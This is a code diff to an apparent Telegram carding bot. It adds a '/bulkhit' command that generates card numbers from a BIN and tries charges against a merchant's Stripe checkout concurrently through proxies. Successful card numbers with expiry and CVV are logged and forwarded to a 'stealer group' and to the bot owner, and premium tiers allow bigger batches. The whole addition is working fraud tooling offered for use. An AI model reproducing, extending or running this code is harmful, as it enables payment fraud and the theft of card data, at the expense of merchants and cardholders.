@@ -12277,6 +12277,221 @@ async def auto_hitter_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     loading_msg = await message.reply_text(f"{PE_BOLT} <b>Fetching checkout...</b>", parse_mode=ParseMode.HTML)
     await _run_auto_hit(update, context, url, cards, loading_msg)
 
+
+# ============================================================================
+# BULK STRIPE HITTER — /bulkhit <url> <count> <bin>
+# ============================================================================
+
+@require_approval
+async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Bulk Stripe Hitter — generates cards from BIN and hits all simultaneously.
+    Usage: /bulkhit <stripe_url> <count> <bin>
+    Example: /bulkhit https://buy.stripe.com/xxx 20 453201
+    """
+    user = update.effective_user
+    message = update.message
+    args = context.args or []
+
+    SEP = "─────────────────────"
+
+    if len(args) < 3:
+        await message.reply_text(
+            f"⚡ <b>BULK STRIPE HITTER</b>\n{SEP}\n\n"
+            f"📝 <b>Usage:</b>\n"
+            f"<code>/bulkhit &lt;url&gt; &lt;count&gt; &lt;bin&gt;</code>\n\n"
+            f"📌 <b>Examples:</b>\n"
+            f"<code>/bulkhit https://buy.stripe.com/xxx 20 453201</code>\n"
+            f"<code>/bulkhit https://buy.stripe.com/xxx 10 453201|xx|xx|xxx</code>\n\n"
+            f"{SEP}\n"
+            f"💎 Premium: up to 50 cards per batch\n"
+            f"👤 Free: up to 10 cards per batch\n\n"
+            f"⚡ All cards are hit <b>simultaneously</b> for maximum speed.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    url_arg = args[0]
+    count_str = args[1]
+    bin_str = args[2]
+
+    # Validate URL
+    checkout_url = extract_checkout_url(url_arg)
+    if not checkout_url:
+        await message.reply_text(
+            f"❌ <b>Invalid URL.</b>\n"
+            f"Must be a Stripe checkout URL.\n"
+            f"Supported: <code>buy.stripe.com</code> · <code>checkout.stripe.com</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # Validate count
+    if not count_str.isdigit() or int(count_str) < 1:
+        await message.reply_text(
+            f"❌ <b>Invalid count.</b> Must be a positive number (e.g. 20).",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # Enforce per-plan limits
+    max_cards = 50 if is_premium(user.id) else 10
+    count = min(int(count_str), max_cards)
+
+    if int(count_str) > max_cards:
+        plan_label = "premium" if is_premium(user.id) else "free"
+        await message.reply_text(
+            f"⚠️ Count capped at <b>{max_cards}</b> for {plan_label} users.",
+            parse_mode=ParseMode.HTML
+        )
+
+    # Parse BIN
+    gen_result = parse_gen_input(bin_str)
+    if not gen_result:
+        await message.reply_text(
+            f"❌ <b>Invalid BIN.</b> Must be at least 6 digits.\n"
+            f"Format: <code>453201</code> or <code>453201|mm|yy|cvv</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    prefix, mm, yy, cvv_pattern = gen_result
+
+    # Generate cards
+    card_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pattern, count)
+    cards = auto_hitter_parse_cards("\n".join(card_lines))
+
+    if not cards:
+        await message.reply_text(
+            f"❌ Failed to generate cards from BIN <code>{prefix}</code>.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # Send loading message
+    loading_msg = await message.reply_text(
+        f"⚡ <b>BULK HITTER</b>\n{SEP}\n"
+        f"💳 Generated <b>{len(cards)}</b> cards from BIN <code>{prefix}</code>\n"
+        f"🔍 Fetching checkout info...",
+        parse_mode=ParseMode.HTML
+    )
+
+    user_proxy = _pick_proxy(user.id)
+    proxy_url = ah_get_proxy_url(user_proxy) if user_proxy else None
+    user_email = ah_get_user_email(user.id) or "checkout@gmail.com"
+
+    # Fetch checkout data
+    try:
+        checkout_data = await tls_get_checkout_info(checkout_url, proxy_url)
+        if not checkout_data.get("pk") or not checkout_data.get("cs"):
+            await loading_msg.edit_text(
+                f"❌ <b>Could not parse checkout URL.</b>\n"
+                f"Make sure the Stripe checkout link is valid and active.",
+                parse_mode=ParseMode.HTML
+            )
+            return
+    except Exception as ex:
+        await loading_msg.edit_text(
+            f"❌ <b>Error fetching checkout:</b> <code>{str(ex)[:120]}</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    merchant = html.escape(str(checkout_data.get("merchant") or "Unknown"))
+    sym = get_currency_symbol(checkout_data.get("currency", "USD"))
+    price = checkout_data.get("price")
+    price_str = f"{sym}{price:.2f}" if price else "N/A"
+    checkout_data["email"] = user_email
+
+    await loading_msg.edit_text(
+        f"⚡ <b>BULK HITTER RUNNING</b>\n{SEP}\n"
+        f"🏪 Merchant: <b>{merchant}</b>\n"
+        f"💰 Amount: <b>{price_str}</b>\n"
+        f"💳 BIN: <code>{prefix}</code> → <b>{len(cards)}</b> cards\n"
+        f"{SEP}\n"
+        f"⏳ Hitting all cards simultaneously...",
+        parse_mode=ParseMode.HTML
+    )
+
+    # Hit all cards concurrently
+    async def _hit_single(card):
+        try:
+            return await auto_hitter_charge(card, checkout_data, user_proxy, user_email)
+        except Exception as ex:
+            return {"status": "ERROR", "response": str(ex)[:60], "time": 0}
+
+    tasks = [_hit_single(card) for card in cards]
+    results_list = await asyncio.gather(*tasks)
+
+    # Tally
+    charged, live, declined, tds, errors = [], [], [], [], []
+    for card, result in zip(cards, results_list):
+        status = result.get("status", "ERROR")
+        card_str = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
+        resp = html.escape(str(result.get("response", ""))[:60])
+
+        if status == "CHARGED":
+            charged.append((card_str, resp))
+            try:
+                log_approved_card(user.id, user.username or user.first_name,
+                                  card["cc"], card["month"], card["year"], card["cvv"],
+                                  "bulk_hitter", resp, {})
+                await send_to_stealer_group(
+                    context.bot, card["cc"], card["month"], card["year"], card["cvv"],
+                    "bulk_hitter", resp, {}, user.id, user.username or user.first_name
+                )
+                await context.bot.send_message(
+                    chat_id=OWNER_ID,
+                    text=(f"⚡ <b>BULK HITTER CHARGED!</b>\n\n"
+                          f"👤 User: @{user.username or user.id}\n"
+                          f"💳 Card: <code>****{card['cc'][-4:]}</code>\n"
+                          f"🏪 Merchant: {merchant}\n💰 Amount: {price_str}"),
+                    parse_mode=ParseMode.HTML
+                )
+            except Exception:
+                pass
+        elif status == "LIVE":
+            live.append((card_str, resp))
+        elif status in ("3DS_REQUIRED", "3DS"):
+            tds.append(card_str)
+        elif status == "DECLINED":
+            declined.append((card_str, resp))
+        else:
+            errors.append(card_str)
+
+    # Build final summary message
+    lines = [
+        f"⚡ <b>BULK HIT COMPLETE</b>",
+        SEP,
+        f"🏪 Merchant: <b>{merchant}</b>",
+        f"💰 Amount: <b>{price_str}</b>",
+        f"💳 BIN: <code>{prefix}</code> | Cards hit: <b>{len(cards)}</b>",
+        SEP,
+        f"✅ Charged: <b>{len(charged)}</b>   "
+        f"💚 Live: <b>{len(live)}</b>   "
+        f"🔴 Declined: <b>{len(declined)}</b>   "
+        f"🔒 3DS: <b>{len(tds)}</b>   "
+        f"❌ Errors: <b>{len(errors)}</b>",
+    ]
+
+    if charged:
+        lines.append(SEP)
+        lines.append(f"✅ <b>CHARGED CARDS:</b>")
+        for c, r in charged[:5]:
+            lines.append(f"<code>{c}</code> — {r}")
+        if len(charged) > 5:
+            lines.append(f"...and {len(charged) - 5} more")
+
+    if live:
+        lines.append(SEP)
+        lines.append(f"💚 <b>LIVE CARDS:</b>")
+        for c, r in live[:5]:
+            lines.append(f"<code>{c}</code> — {r}")
+        if len(live) > 5:
+            lines.append(f"...and {len(live) - 5} more")
+
+    await loading_msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
+
+
 # ============================================================================
 # SAVED BINS COMMANDS
 # ============================================================================
@@ -14344,6 +14559,7 @@ def main():
     # Auto Hitter handlers
     application.add_handler(CommandHandler("co", auto_hitter_command))
     application.add_handler(CommandHandler("hit", auto_hitter_command))
+    application.add_handler(CommandHandler("bulkhit", bulkhit_command))
     application.add_handler(CommandHandler("coinfo", coinfo_command))
     application.add_handler(CommandHandler("cocheck", cocheck_command))
     application.add_handler(CommandHandler("mco", mco_command))
